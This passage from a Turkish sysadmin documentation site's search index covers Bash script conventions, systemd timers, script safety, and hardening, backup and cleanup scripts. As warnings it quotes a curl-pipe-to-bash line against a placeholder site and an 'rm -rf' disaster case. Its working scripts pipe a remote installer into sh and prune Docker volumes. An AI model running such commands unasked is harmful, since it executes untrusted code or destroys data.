find \"$backup_dir\" -name \"${db_name}_*.sql.gz\" -mtime +${retention} -delete\n\n    success \"Script tamamland\u0131\"\n}\n\n# ============================================\n# SCRIPT BA\u015eLANGICI\n# ============================================\n\nmain \"$@\"\n</code></pre>"},{"location":"scripts/bash-guide/#yararl-komutlar","title":"\ud83d\udcda Yararl\u0131 Komutlar","text":""},{"location":"scripts/bash-guide/#awk-ornekleri","title":"awk \u00d6rnekleri","text":"<pre><code># Belirli s\u00fctunu yazd\u0131r\nawk '{print $1}' file.txt\n\n# Ko\u015fullu yazd\u0131rma\nawk '$3 &gt; 100 {print $1, $3}' file.txt\n\n# Toplam hesapla\nawk '{sum += $2} END {print sum}' file.txt\n\n# CSV parse\nawk -F',' '{print $1, $3}' data.csv\n</code></pre>"},{"location":"scripts/bash-guide/#sed-ornekleri","title":"sed \u00d6rnekleri","text":"<pre><code># De\u011fi\u015ftir\nsed 's/old/new/' file.txt\nsed 's/old/new/g' file.txt  # T\u00fcm e\u015fle\u015fmeler\n\n# Sat\u0131r sil\nsed '/pattern/d' file.txt\n\n# Sat\u0131r ekle\nsed '3i\\New line' file.txt  # 3. sat\u0131rdan \u00f6nce\n\n# In-place d\u00fczenleme\nsed -i 's/old/new/g' file.txt\n</code></pre>"},{"location":"scripts/bash-guide/#grep-ornekleri","title":"grep \u00d6rnekleri","text":"<pre><code># Basit arama\ngrep \"pattern\" file.txt\n\n# Case-insensitive\ngrep -i \"pattern\" file.txt\n\n# Sat\u0131r numaras\u0131 ile\ngrep -n \"pattern\" file.txt\n\n# Recursive\ngrep -r \"pattern\" /path/\n\n# Ters arama (e\u015fle\u015fmeyenleri g\u00f6ster)\ngrep -v \"pattern\" file.txt\n\n# Regex\ngrep -E \"pattern1|pattern2\" file.txt\n</code></pre>"},{"location":"scripts/bash-guide/#referanslar","title":"\ud83d\udd17 Referanslar","text":"<ul> <li>Bash Manual</li> <li>ShellCheck - Script validator</li> <li>Google Shell Style Guide</li> </ul>"},{"location":"scripts/conventions/","title":"Script Yaz\u0131m Standartlar\u0131","text":"<p>Prod\u00fcksiyon ortam\u0131nda \u00e7al\u0131\u015facak bir script, \"\u00e7al\u0131\u015f\u0131p i\u015fini yapmas\u0131\" kadar \"hata an\u0131nda d\u00fczg\u00fcn patlamas\u0131\" ile de \u00f6l\u00e7\u00fcl\u00fcr.</p>"},{"location":"scripts/conventions/#1-altn-kural-bash-strict-mode","title":"1. Alt\u0131n Kural: Bash Strict Mode","text":"<p>Her Bash scriptinizin ilk sat\u0131r\u0131 (shebang'den sonra) mutlaka \u015fu olmal\u0131:</p> <pre><code>#!/bin/bash\nset -euo pipefail\n</code></pre>"},{"location":"scripts/conventions/#bu-ne-ise-yarar","title":"Bu ne i\u015fe yarar?","text":"<ul> <li><code>set -e</code> (Exit on Error): Bir komut hata verirse (exit code != 0), script \u00e7al\u0131\u015fmaya devam etmez, an\u0131nda durur.</li> <li>\u0130stisna: <code>mkdir dosya || true</code> gibi hatay\u0131 bilerek y\u00f6netti\u011finiz yerler.</li> <li><code>set -u</code> (Unset Variables): Tan\u0131mlanmam\u0131\u015f bir de\u011fi\u015fken kullan\u0131rsan\u0131z hata verir. (<code>rm -rf /$BILINMEYEN_DEGISKEN</code> facias\u0131n\u0131 \u00f6nler).</li> <li><code>set -o pipefail</code>: Boru hatt\u0131nda (<code>cmd1 | cmd2</code>) biri hata verirse t\u00fcm i\u015flemi hatal\u0131 sayar. Varsay\u0131lan davran\u0131\u015fta sadece <code>cmd2</code> ba\u015far\u0131s\u0131z olursa hata d\u00f6nerdi.</li> </ul>"},{"location":"scripts/conventions/#2-degisken-isimlendirme","title":"2. De\u011fi\u015fken \u0130simlendirme","text":"<ul> <li>B\u00dcY\u00dcK_HARF: Sadece <code>export</code> edilen ortam de\u011fi\u015fkenleri (Environment Variables) ve sabitler (Constants) i\u00e7in.</li> <li>k\u00fc\u00e7\u00fck_harf: Script i\u00e7i yerel de\u011fi\u015fkenler i\u00e7in.</li> </ul> <pre><code># Do\u011fru\nDATABASE_URL=\"postgres://...\"\nbackup_dir=\"/tmp/backups\"\n\n# Yanl\u0131\u015f\nBACKUPDIR=\"/tmp\" # Sistem de\u011fi\u015fkeni san\u0131labilir\n</code></pre>"},{"location":"scripts/conventions/#3-loglama-ve-fonksiyonlar","title":"3. Loglama ve Fonksiyonlar","text":"<p>Her \u015feyi <code>echo</code> ile yazd\u0131rmay\u0131n. Okunabilir log fonksiyonlar\u0131 kullan\u0131n:</p> <pre><code>log_info() { echo -e \"[\\033[34mINFO\\033[0m] $1\"; }\nlog_success() { echo -e \"[\\033[32mOK\\033[0m] $1\"; }\nlog_error() { echo -e \"[\\033[31mERROR\\033[0m] $1\" &gt;&amp;2; }\n\n# Kullan\u0131m\nlog_info \"Yedekleme ba\u015fl\u0131yor...\"\n</code></pre>"},{"location":"scripts/conventions/#4-linting-kod-denetimi","title":"4. Linting (Kod Denetimi)","text":"<p>Scriptlerinizi commit etmeden \u00f6nce mutlaka ShellCheck ile taray\u0131n. VS Code eklentisi mevcuttur.</p> <pre><code># MacOS Kurulumu\nbrew install shellcheck\n\n# Kontrol\nshellcheck my-script.sh\n</code></pre>"},{"location":"scripts/conventions/#5-sablon-boilerplate","title":"5. \u015eablon (Boilerplate)","text":"<p>Yeni bir script yazarken bu \u015fablonu kopyalay\u0131n:</p> <pre><code>#!/bin/bash\nset -euo pipefail\n\n# --- Konfig\u00fcrasyon ---\nreadonly WORK_DIR=\"/opt/app\"\nreadonly NOW=$(date +%Y%m%d_%H%M%S)\n\n# --- Yard\u0131m ---\nusage() {\n    echo \"Kullan\u0131m: $0 [options]\"\n    exit 1\n}\n\n# --- Ana Ak\u0131\u015f ---\nmain() {\n    if [[ $EUID -ne 0 ]]; then\n       echo \"Bu script root olarak \u00e7al\u0131\u015ft\u0131r\u0131lmal\u0131d\u0131r.\"\n       exit 1\n    fi\n\n    echo \"\u0130\u015flem ba\u015flad\u0131: $NOW\"\n    # Kodlar buraya...\n}\n\nmain \"$@\"\n</code></pre>"},{"location":"scripts/execution/","title":"Script \u00c7al\u0131\u015ft\u0131rma Standartlar\u0131","text":"<p>Scripti yazd\u0131k, peki nas\u0131l \u00e7al\u0131\u015ft\u0131raca\u011f\u0131z? \"Arkaplanda \u00e7al\u0131\u015fs\u0131n\" veya \"Her gece \u00e7al\u0131\u015fs\u0131n\" dedi\u011fimizde akl\u0131m\u0131za gelen ilk y\u00f6ntemler (<code>nohup</code>, <code>cron</code>) genelde en iyi y\u00f6ntemler de\u011fildir.</p>"},{"location":"scripts/execution/#1-zamanlanms-gorevler-cron-vs-systemd-timers","title":"1. Zamanlanm\u0131\u015f G\u00f6revler: Cron vs Systemd Timers","text":"<p>Prod\u00fcksiyon sunucular\u0131nda Cron kullanmay\u0131 \u00f6nermiyoruz. Neden?</p> <ul> <li>Cron hatay\u0131 sessizce yutar (Loglamazsa g\u00f6remezsiniz).</li> <li>Ba\u011f\u0131ml\u0131l\u0131k y\u00f6netemez (Network gelmeden \u00e7al\u0131\u015f\u0131rsa patlar).</li> </ul>"},{"location":"scripts/execution/#onerilen-systemd-timers","title":"\u00d6nerilen: Systemd Timers","text":"<p>Bir i\u015fi her gece 03:00'te yapmak i\u00e7in iki dosya olu\u015fturuyoruz:</p>"},{"location":"scripts/execution/#a-service-dosyas-etcsystemdsystemmyscriptservice","title":"A. Service Dosyas\u0131 (<code>/etc/systemd/system/myscript.service</code>)","text":"<p>Ger\u00e7ek i\u015fi yapan tan\u0131m.</p> <pre><code>[Unit]\nDescription=My Backup Script\n\n[Service]\nType=oneshot\nExecStart=/opt/scripts/backup.sh\nUser=deployer\n</code></pre>"},{"location":"scripts/execution/#b-timer-dosyas-etcsystemdsystemmyscripttimer","title":"B. Timer Dosyas\u0131 (<code>/etc/systemd/system/myscript.timer</code>)","text":"<p>Zamanlay\u0131c\u0131 tan\u0131m\u0131.</p> <pre><code>[Unit]\nDescription=Run backup every night\n\n[Timer]\nOnCalendar=*-*-* 03:00:00\nPersistent=true\n\n[Install]\nWantedBy=timers.target\n</code></pre> <p>Aktifle\u015ftirme:</p> <pre><code>systemctl daemon-reload\nsystemctl enable --now myscript.timer\n</code></pre>"},{"location":"scripts/execution/#2-arkaplan-islemleri-background-execution","title":"2. Arkaplan \u0130\u015flemleri (Background Execution)","text":"<p>Bir scripti SSH'\u0131 kapatt\u0131ktan sonra da \u00e7al\u0131\u015fs\u0131n diye <code>nohup script.sh &amp;</code> ile \u00e7al\u0131\u015ft\u0131rmak \"amat\u00f6rce\"dir. S\u00fcre\u00e7 y\u00f6netilemez, \u00f6ld\u00fcr\u00fclemez, loglar\u0131 kar\u0131\u015f\u0131r.</p>"},{"location":"scripts/execution/#cozum-systemd-service-typesimple","title":"\u00c7\u00f6z\u00fcm: Systemd Service (Type=simple)","text":"<p>E\u011fer bir bot veya s\u00fcrekli \u00e7al\u0131\u015fan bir scriptiniz varsa, onu daima Systemd servisi yap\u0131n.</p> <p>Rehber: Kendi Systemd Servisini Yaz</p>"},{"location":"scripts/execution/#3-loglama-yonetimi","title":"3. Loglama Y\u00f6netimi","text":"<p>Script \u00e7\u0131kt\u0131lar\u0131n\u0131 (<code>stdout</code>) y\u00f6netmek \u00f6nemlidir.</p>"},{"location":"scripts/execution/#kotu-yontem","title":"K\u00f6t\u00fc Y\u00f6ntem","text":"<pre><code>./script.sh &gt;&gt; /var/log/app.log 2&gt;&amp;1\n</code></pre> <p>Bu dosya sonsuza kadar b\u00fcy\u00fcr ve diski doldurur (Disk Full vakalar\u0131n\u0131n 1 numaral\u0131 sebebidir).</p>"},{"location":"scripts/execution/#iyi-yontem-logrotate-veya-journald","title":"\u0130yi Y\u00f6ntem (Logrotate veya Journald)","text":"<p>Systemd ile \u00e7al\u0131\u015ft\u0131r\u0131rsan\u0131z, \u00e7\u0131kt\u0131lar otomatik olarak <code>journalctl</code> taraf\u0131ndan y\u00f6netilir ve s\u0131k\u0131\u015ft\u0131r\u0131l\u0131r.</p> <p>Loglar\u0131 izlemek i\u00e7in:</p> <pre><code>journalctl -u myscript.service -f\n</code></pre>"},{"location":"scripts/safety/","title":"Script G\u00fcvenli\u011fi","text":"<p>Otomasyon harikad\u0131r, ancak g\u00fcvensiz bir script sunucuyu sald\u0131rganlara alt\u0131n tepside sunabilir.</p>"},{"location":"scripts/safety/#1-srlar-ve-sifreler-secrets","title":"1. S\u0131rlar ve \u015eifreler (Secrets)","text":"<p>\u274c ASLA YAPMA: Scriptin i\u00e7ine \u015fifre g\u00f6mmek. Script git reposuna giderse \u015fifreniz de gider.</p> <pre><code>DB_PASSWORD=\"cokgizlisifre\" # YANLI\u015e!\n</code></pre> <p>\u2705 DO\u011eRUSU: \u015eifreleri <code>.env</code> dosyas\u0131ndan veya ortam de\u011fi\u015fkenlerinden okuyun.</p> <pre><code># Script ba\u015f\u0131\nif [ -f .env ]; then\n    source .env\nfi\n\nif [ -z \"${DB_PASSWORD:-}\" ]; then\n    echo \"Hata: DB_PASSWORD ayarlanmam\u0131\u015f!\"\n    exit 1\nfi\n</code></pre> <p><code>.env</code> dosyas\u0131n\u0131 <code>.gitignore</code>'a eklemeyi unutmay\u0131n!</p>"},{"location":"scripts/safety/#2-curl-bash-tehlikesi","title":"2. Curl | Bash Tehlikesi","text":"<p>\u0130nternetten buldu\u011funuz scriptleri direkt pipe ederek \u00e7al\u0131\u015ft\u0131rmay\u0131n:</p> <pre><code>curl http://bilinmeyen-site.com/setup.sh | bash\n</code></pre> <p>Risk: Ba\u011flant\u0131 kesilirse script yar\u0131m inip \u00e7al\u0131\u015fabilir veya sunucu taraf\u0131nda i\u00e7erik de\u011fi\u015ftirilebilir.</p> <p>G\u00fcvenli Y\u00f6ntem:</p> <ol> <li>\u0130ndir (<code>curl -O ...</code>)</li> <li>Oku/\u0130ncele (<code>cat script.sh</code>)</li> <li>\u00c7al\u0131\u015ft\u0131r (<code>bash script.sh</code>)</li> </ol>"},{"location":"scripts/safety/#3-checksum-dogrulama","title":"3. Checksum Do\u011frulama","text":"<p>Kritik bir ara\u00e7 indiriyorsan\u0131z (\u00f6rn: Docker, kubectl), indirdi\u011finiz dosyan\u0131n b\u00fct\u00fcnl\u00fc\u011f\u00fcn\u00fc do\u011frulay\u0131n:</p> <pre><code>echo \"b85f... beklenen_hash  dosya.tar.gz\" | sha256sum --check\n</code></pre>"},{"location":"scripts/safety/#4-en-az-yetki-prensibi-least-privilege","title":"4. En Az Yetki Prensibi (Least Privilege)","text":"<p>Her scripti <code>root</code> olarak \u00e7al\u0131\u015ft\u0131rmak zorunda de\u011filsiniz.</p> <ul> <li>Web sunucusu i\u015flemleri i\u00e7in <code>www-data</code>.</li> <li>Yedekleme i\u00e7in <code>backup-user</code>.</li> <li>Uygulama i\u00e7in <code>deployer</code>.</li> </ul> <p>Script ba\u015f\u0131nda <code>sudo</code> gerekliyse kontrol edin:</p> <pre><code>if [[ $EUID -ne 0 ]]; then\n   echo \"Bu script root yetkisi gerektirir.\"\n   exit 1\nfi\n</code></pre>"},{"location":"scripts/library/audit/","title":"Security Audit Script \ud83d\udd75\ufe0f\u200d\u2642\ufe0f","text":"<p>\"Sunucum ne kadar g\u00fcvenli?\" sorusunun cevab\u0131n\u0131 veren h\u0131zl\u0131 tarama scripti.</p>"},{"location":"scripts/library/audit/#ne-kontrol-eder","title":"Ne Kontrol Eder?","text":"<ul> <li>A\u00e7\u0131k Portlar (Hangileri dinliyor?)</li> <li>UFW Durumu (Aktif mi?)</li> <li>SSH Root Login (A\u00e7\u0131k m\u0131?)</li> <li>Docker Socket Durumu</li> <li>Disk Kullan\u0131m\u0131</li> </ul>"},{"location":"scripts/library/audit/#kullanm","title":"Kullan\u0131m","text":"<p>Ara s\u0131ra manuel \u00e7al\u0131\u015ft\u0131r\u0131n.</p> <pre><code>./audit.sh\n</code></pre>"},{"location":"scripts/library/audit/#kaynak-kod","title":"Kaynak Kod","text":"<pre><code>#!/bin/bash\n\necho \"\ud83d\udd0d SECURITY AUDIT STARTING...\"\necho \"==============================\"\n\n# 1. UFW Check\necho \"[+] Checking UFW Status:\"\nufw status | grep \"Status\" || echo \"\u274c UFW Not Found\"\n\n# 2. Listening Ports\necho -e \"\\n[+] Listening Ports (Public):\"\n# 0.0.0.0 veya [::] dinleyenleri bul\nss -tulpn | grep -E '0.0.0.0|\\[::\\]'\n\n# 3. SSH Config Check\necho -e \"\\n[+] Checking SSH Config:\"\ngrep \"^PermitRootLogin\" /etc/ssh/sshd_config || echo \"\u26a0\ufe0f PermitRootLogin setting not found (Default might be YES)\"\ngrep \"^PasswordAuthentication\" /etc/ssh/sshd_config || echo \"\u26a0\ufe0f PasswordAuthentication setting not found\"\n\n# 4. Fail2Ban\necho -e \"\\n[+] Fail2Ban Status:\"\nsystemctl is-active fail2ban &gt;/dev/null &amp;&amp; echo \"\u2705 Active\" || echo \"\u274c Inactive\"\n\n# 5. Docker Check\necho -e \"\\n[+] Docker Socket Rights:\"\nls -l /var/run/docker.sock\n\necho -e \"\\n[+] Disk Usage:\"\ndf -h /\n\necho \"==============================\"\necho \"AUDIT COMPLETE\"\n</code></pre>"},{"location":"scripts/library/backup/","title":"Database Backup Script \ud83d\udcbe","text":"<p>Basit, g\u00fcvenilir ve rotasyonlu (eskileri silen) yedekleme scripti.</p>"},{"location":"scripts/library/backup/#ozellikler","title":"\u00d6zellikler","text":"<ul> <li>Docker i\u00e7indeki Postgres veya MySQL'i yedekler.</li> <li>Yedekleri tarihli (<code>db-2023-10-27.sql.gz</code>) kaydeder.</li> <li>Rotasyon: 7 g\u00fcnden eski dosyalar\u0131 otomatik siler.</li> <li>S\u0131k\u0131\u015ft\u0131rma: Gzip ile yer tasarrufu sa\u011flar.</li> </ul>"},{"location":"scripts/library/backup/#kullanm","title":"Kullan\u0131m","text":"<pre><code>nano /usr/local/bin/backup-db.sh\nchmod +x /usr/local/bin/backup-db.sh\n\n# Crontab (Her gece 02:00)\n0 2 * * * /usr/local/bin/backup-db.sh\n</code></pre>"},{"location":"scripts/library/backup/#kaynak-kod","title":"Kaynak Kod","text":"<pre><code>#!/bin/bash\nset -euo pipefail\n\n# --- CONFIG ---\nBACKUP_DIR=\"/var/backups/db\"\nCONTAINER_NAME=\"postgres_container_name\"\nDB_USER=\"postgres\"\nDB_NAME=\"myapp_db\"\nRETENTION_DAYS=7\nDATE=$(date +%Y-%m-%d_%H%M)\n# --------------\n\nmkdir -p $BACKUP_DIR\n\necho \"\ud83d\udcbe Yedekleme Basliyor: $DATE\"\n\n# 1. Dump Al (Postgres)\n# MySQL icin: docker exec $CONTAINER_NAME mysqldump -u... kullanin\ndocker exec -t $CONTAINER_NAME pg_dump -U $DB_USER $DB_NAME | gzip &gt; \"$BACKUP_DIR/db-$DATE.sql.gz\"\n\n# 2. Basari Kontrolu\nif [ $? -eq 0 ]; then\n    echo \"\u2705 Yedek Basarili: $BACKUP_DIR/db-$DATE.sql.gz\"\nelse\n    echo \"\u274c Yedek ALINAMADI!\"\n    exit 1\nfi\n\n# 3. Rotasyon (Eskileri Sil)\necho \"\ud83d\uddd1\ufe0f $RETENTION_DAYS gunden eski yedekler siliniyor...\"\nfind $BACKUP_DIR -name \"db-*.sql.gz\" -mtime +$RETENTION_DAYS -delete\n\n# 4. (Opsiyonel) Offsite Copy\n# 4. (Opsiyonel) Offsite Copy - Rclone\n# Rclone config yapilmis olmali: `rclone config`\n# rclone copy \"$BACKUP_DIR/db-$DATE.sql.gz\" remote:my-backups/ --quiet\n# Veya klasoru senkronize et:\n# rclone sync $BACKUP_DIR remote:my-backups/ --delete-after\n</code></pre>"},{"location":"scripts/library/bootstrap/","title":"Server Bootstrap Script \ud83d\udee1\ufe0f","text":"<p>Bu script, bo\u015f bir Ubuntu/Debian sunucuyu (Fresh Install) tek komutla \"Prod-Ready\" hale getirir.</p> <p>G\u00dcNCELLEME (v2): Timezone, Kernel Hardening, Docker Compose v2 ve detayl\u0131 loglama eklendi.</p>"},{"location":"scripts/library/bootstrap/#ozellikler","title":"\u00d6zellikler","text":"<ul> <li>Kullan\u0131c\u0131: <code>deployer</code> kullan\u0131c\u0131s\u0131 (Sudo yetkisiyle).</li> <li>SSH: Port 2222, Root Login Kapal\u0131, Timeout ayarlar\u0131.</li> <li>G\u00fcvenlik: UFW, Fail2Ban (SSH korumal\u0131), Kernel Hardening.</li> <li>Sistem: Timezone (Europe/Istanbul), Swap, Auto-Upgrades.</li> <li>Docker: Docker Engine + Compose v2.</li> </ul>"},{"location":"scripts/library/bootstrap/#kullanm","title":"Kullan\u0131m","text":"<p>Scripti sunucuda bir dosyaya yap\u0131\u015ft\u0131r\u0131n ve \u00e7al\u0131\u015ft\u0131r\u0131n.</p> <pre><code>nano setup.sh\n# Kodu yap\u0131\u015ft\u0131r\nchmod +x setup.sh\n./setup.sh\n</code></pre>"},{"location":"scripts/library/bootstrap/#kaynak-kod","title":"Kaynak Kod","text":"<pre><code>#!/bin/bash\nset -euo pipefail\n\n# --- CONFIG ---\nNEW_USER=\"deployer\"\nSSH_PORT=\"2222\"\nSWAP_SIZE=\"2G\"\nTIMEZONE=\"Europe/Istanbul\"\n# --------------\n\nLOG_FILE=\"/var/log/server-setup.log\"\nexec &gt; &gt;(tee -a \"$LOG_FILE\") 2&gt;&amp;1\n\necho \"\ud83d\ude80 Sunucu Kurulumu Baslatiliyor... $(date)\"\n\n# 1. Root Kontrolu\nif [ \"$EUID\" -ne 0 ]; then\n  echo \"\u274c Lutfen root olarak calistirin (sudo su)\"\n  exit 1\nfi\n\n# 2. Backup SSH Config\ncp /etc/ssh/sshd_config /etc/ssh/sshd_config.backup.$(date +%Y%m%d)\n\n# 3. Update\necho \"\ud83d\udce6 Paketler guncelleniyor...\"\napt update &amp;&amp; apt upgrade -y\napt install -y ufw fail2ban curl git unattended-upgrades \\\n               htop vim tmux ncdu net-tools\n\n# 4. Timezone\necho \"\ud83d\udd50 Timezone ayarlan\u0131yor: $TIMEZONE\"\ntimedatectl set-timezone $TIMEZONE\nlocale-gen en_US.UTF-8\nupdate-locale LANG=en_US.UTF-8\n\n# 5. Create User\nif id \"$NEW_USER\" &amp;&gt;/dev/null; then\n    echo \"\u26a0\ufe0f Kullanici $NEW_USER zaten var.\"\nelse\n    echo \"\ud83d\udc64 Kullanici olusturuluyor: $NEW_USER\"\n    adduser --gecos \"\" --disabled-password $NEW_USER\n    echo \"$NEW_USER:$(openssl rand -base64 32)\" | chpasswd\n    usermod -aG sudo $NEW_USER\n\n    mkdir -p /home/$NEW_USER/.ssh\n    chmod 700 /home/$NEW_USER/.ssh\n    touch /home/$NEW_USER/.ssh/authorized_keys\n    chmod 600 /home/$NEW_USER/.ssh/authorized_keys\n\n    if [ -f /root/.ssh/authorized_keys ]; then\n        cp /root/.ssh/authorized_keys /home/$NEW_USER/.ssh/\n        chown -R $NEW_USER:$NEW_USER /home/$NEW_USER/.ssh\n    fi\nfi\n\n# 6. SSH Hardening\necho \"\ud83d\udd12 SSH sertlestiriliyor (Port: $SSH_PORT)...\"\ncat &gt; /etc/ssh/sshd_config.d/hardening.conf &lt;&lt; EOF\nPort $SSH_PORT\nPermitRootLogin no\nPasswordAuthentication no\nPubkeyAuthentication yes\nX11Forwarding no\nMaxAuthTries 3\nClientAliveInterval 300\nClientAliveCountMax 2\nAllowUsers $NEW_USER\nEOF\n\n# SSH config test\nif sshd -t; then\n    systemctl restart sshd\nelse\n    echo \"\u274c SSH Config HATALI! Restart edilmedi.\"\nfi\n\n# 7. Firewall (UFW)\necho \"\ud83e\uddf1 Firewall ayarlaniyor...\"\nufw default deny incoming\nufw default allow outgoing\nufw allow $SSH_PORT/tcp comment 'SSH'\nufw allow 80/tcp comment 'HTTP'\nufw allow 443/tcp comment 'HTTPS'\nufw --force enable\n\n# 8. Fail2Ban\necho \"\ud83d\udc6e Fail2Ban ayarlaniyor...\"\ncat &gt; /etc/fail2ban/jail.local &lt;&lt; EOF\n[DEFAULT]\nbantime = 3600\nfindtime = 600\nmaxretry = 3\n\n[sshd]\nenabled = true\nport = $SSH_PORT\nfilter = sshd\nlogpath = /var/log/auth.log\nmaxretry = 3\nEOF\n\nsystemctl enable --now fail2ban\nsystemctl restart fail2ban\n\n# 9. Docker Install\nif ! command -v docker &amp;&gt; /dev/null; then\n    echo \"\ud83d\udc33 Docker kuruluyor...\"\n    curl -fsSL https://get.docker.com | sh\n    usermod -aG docker $NEW_USER\n\n    # Docker Compose\n    apt install -y docker-compose-plugin\nelse\n    echo \"\u2705 Docker zaten kurulu.\"\nfi\n\n# 10. Swap Setup\nif [ $(swapon --show | wc -l) -eq 0 ]; then\n    echo \"\ud83d\udcbe Swap ($SWAP_SIZE) olusturuluyor...\"\n    fallocate -l $SWAP_SIZE /swapfile\n    chmod 600 /swapfile\n    mkswap /swapfile\n    swapon /swapfile\n    echo '/swapfile none swap sw 0 0' &gt;&gt; /etc/fstab\n\n    # Swappiness ayarla\n    sysctl vm.swappiness=10\n    echo \"vm.swappiness=10\" &gt;&gt; /etc/sysctl.conf\nfi\n\n# 11. Unattended Upgrades\necho \"\ufffd Otomatik g\u00fcncellemeler ayarlan\u0131yor...\"\ncat &gt; /etc/apt/apt.conf.d/20auto-upgrades &lt;&lt; EOF\nAPT::Periodic::Update-Package-Lists \"1\";\nAPT::Periodic::Unattended-Upgrade \"1\";\nAPT::Periodic::AutocleanInterval \"7\";\nEOF\n\n# 12. Kernel Hardening (Basit)\ncat &gt;&gt; /etc/sysctl.conf &lt;&lt; EOF\n\n# Security Hardening\nnet.ipv4.tcp_syncookies = 1\nnet.ipv4.conf.all.rp_filter = 1\nnet.ipv4.conf.default.rp_filter = 1\nnet.ipv4.icmp_echo_ignore_broadcasts = 1\nnet.ipv4.conf.all.accept_redirects = 0\nnet.ipv4.conf.all.send_redirects = 0\nEOF\nsysctl -p\n\necho \"\"\necho \"\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\"\necho \"\u2705 Kurulum Tamamlandi!\"\necho \"\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\"\necho \"\"\necho \"\ud83d\udccb \u00d6ZET:\"\necho \"   \u2022 Kullan\u0131c\u0131: $NEW_USER\"\necho \"   \u2022 SSH Port: $SSH_PORT\"\necho \"   \u2022 Firewall: Aktif (80, 443, $SSH_PORT)\"\necho \"   \u2022 Fail2Ban: Aktif\"\necho \"   \u2022 Docker: Kurulu\"\necho \"\"\necho \"\u26a0\ufe0f  \u00d6NEML\u0130 ADIMLAR:\"\necho \"   1. MEVCUT TERM\u0130NAL\u0130 KAPATMAYIN!\"\necho \"   2. Yeni terminal a\u00e7\u0131n ve test edin:\"\necho \"      ssh -p $SSH_PORT $NEW_USER@&lt;SERVER_IP&gt;\"\necho \"\"\necho \"   3. Ba\u011flant\u0131 ba\u015far\u0131l\u0131ysa sunucuyu reboot edin:\"\necho \"      sudo reboot\"\necho \"\"\necho \"\ud83d\udcdd Log dosyas\u0131: $LOG_FILE\"\necho \"\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\"\n</code></pre>"},{"location":"scripts/library/health-check/","title":"Health Check Script","text":"<p>Otomatik sistem sa\u011fl\u0131k kontrol\u00fc yapan ve raporlayan script.</p>"},{"location":"scripts/library/health-check/#kullanm","title":"Kullan\u0131m","text":"<pre><code>./scripts/health-check.sh\n</code></pre>"},{"location":"scripts/library/health-check/#kontrol-edilenler","title":"Kontrol Edilenler","text":"<ul> <li>CPU/RAM: %90 \u00fczeri kullan\u0131mda uyar\u0131</li> <li>Disk: %85 \u00fczeri kullan\u0131mda uyar\u0131</li> <li>Servisler: Docker, Nginx, SSH durumu</li> <li>Portlar: 80, 443 eri\u015filebilirli\u011fi</li> </ul>"},{"location":"scripts/library/health-check/#ornek-ckt","title":"\u00d6rnek \u00c7\u0131kt\u0131","text":"<pre><code>[OK]  CPU Load: 0.45\n[OK]  Memory Usage: 45%\n[OK]  Disk Usage: 55%\n[OK]  Docker Service is UP\n</code></pre>"},{"location":"scripts/library/maintenance/","title":"Maintenance (Temizlik) Scripti \ud83e\uddf9","text":"<p>Bu script, sunucuda zamanla biriken \"dijital at\u0131klar\u0131\" temizler ve diskin dolmas\u0131n\u0131 engeller.</p>"},{"location":"scripts/library/maintenance/#ne-yapar","title":"Ne Yapar?","text":"<ol> <li>Docker Prune: Kullan\u0131lmayan image, container ve networkleri siler.</li> <li>Journal Vacuum: 3 g\u00fcnden eski systemd loglar\u0131n\u0131 siler.</li> <li>Apt Autoremove: Gereksiz paketleri temizler.</li> <li>Disk Check: Doluluk %80'i ge\u00e7tiyse uyar\u0131 verir (Mail/Slack entegrasyonu eklenebilir).</li> </ol>"},{"location":"scripts/library/maintenance/#kullanm-cron","title":"Kullan\u0131m (Cron)","text":"<p>Haftal\u0131k \u00e7al\u0131\u015fmas\u0131 i\u00e7in crontab'a ekleyin:</p> <pre><code># Scripti kaydet\nnano /usr/local/bin/maintenance.sh\nchmod +x /usr/local/bin/maintenance.sh\n\n# Crontab a\u00e7\ncrontab -e\n# \u015eunu ekle (Her Pazar gece 03:00):\n0 3 * * 0 /usr/local/bin/maintenance.sh &gt;&gt; /var/log/maintenance.log 2&gt;&amp;1\n</code></pre>"},{"location":"scripts/library/maintenance/#kaynak-kod","title":"Kaynak Kod","text":"<pre><code>#!/bin/bash\nset -u\n\necho \"\ud83e\uddf9 Temizlik Basladi: $(date)\"\n\n# 1. Docker Temizligi (Durdurulmus her seyi siler)\nif command -v docker &amp;&gt; /dev/null; then\n    echo \"\ud83d\udc33 Docker System Prune...\"\n    # -a: Kullanilmayan image'lari da sil\n    # -f: Onay sorma\n    docker system prune -af --volumes\nfi\n\n# 2. Log Temizligi (Systemd)\necho \"\ud83d\udcdc Journalctl Vacuum (3 gun)...\"\njournalctl --vacuum-time=3d\n\n# 3. Paket Temizligi\necho \"\ud83d\udce6 Apt Autoremove...\"\napt-get autoremove -y\napt-get clean\n\n# 4. Disk Kontrol\nUSAGE=$(df / | grep / | awk '{ print $5 }' | sed 's/%//g')\nif [ \"$USAGE\" -gt 85 ]; then\n    echo \"\ud83d\udea8 UYARI: Disk Doluluk Orani %$USAGE!\"\n    # Buraya mail atma veya Slack webhook kodu eklenebilir\n    # curl -X POST -H 'Content-type: application/json' --data '{\"text\":\"Disk Dolu!\"}' HOOK_URL\nelse\n    echo \"\u2705 Disk Durumu: %$USAGE (Normal)\"\nfi\n\necho \"\ud83c\udfc1 Temizlik Bitti: $(date)\"\n</code></pre>"},{"location":"scripts/library/restore/","title":"Database Restore","text":"<p>Veritaban\u0131 yedeklerinden geri y\u00fckleme 